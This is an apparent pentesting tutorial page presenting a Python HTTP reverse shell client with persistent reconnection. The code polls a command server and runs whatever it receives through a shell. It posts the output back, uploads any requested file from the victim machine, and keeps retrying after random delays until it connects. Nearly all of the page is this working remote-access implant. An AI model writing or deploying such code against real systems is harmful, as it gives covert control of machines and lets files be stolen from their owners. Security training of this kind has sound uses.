---
title: Tunning the connection attempts
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
---

# Tunning the connection attempts


## Client side

We put our previous [http shell](coding-an-http-reverse-shell.md) in a function called connect.

```python
import requests
import os
import subprocess
import time

import random # Needed to generate random 


def connect(): # we put our previous http shell in a function called connect

    while True:

        req = requests.get('http://127.0.0.1:8080')
        command = req.text

        if 'terminate' in command:
            return 1 # if we got terminate order, then we exit connect function and return a value of 1, this value will be used to end up the whole script


        elif 'grab' in command:
            grab, path = command.split("*")
            if os.path.exists(path):
                url = "http://127.0.0.1:8080/store"
                files = {'file': open(path, 'rb')}
                r = requests.post(url, files=files)
            else:
                post_response = requests.post(url='http://127.0.0.1:8080', data='[-] Not able to find the file!'.encode())
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            post_response = requests.post(url='http://127.0.0.1:8080', data=CMD.stdout.read())
            post_response = requests.post(url='http://127.0.0.1:8080', data=CMD.stderr.read())
    time.sleep(3)


# Here we start our infinite loop, we try to connect to our kali server, if we got an exception (connection error)
# then we will sleep for a random time between 1 and 10 seconds and we will pass that exception and go back to the 
# infinite loop once again untill we got a sucessful connection. 


while True:
    try:
        if connect() == 1:
            break
    except:
        sleep_for = random.randrange(1, 10)#Sleep for a random time between 1-10 seconds
        time.sleep(int(sleep_for))
        #time.sleep( sleep_for * 60 )      #Sleep for a random time between 1-10 minutes
        pass

```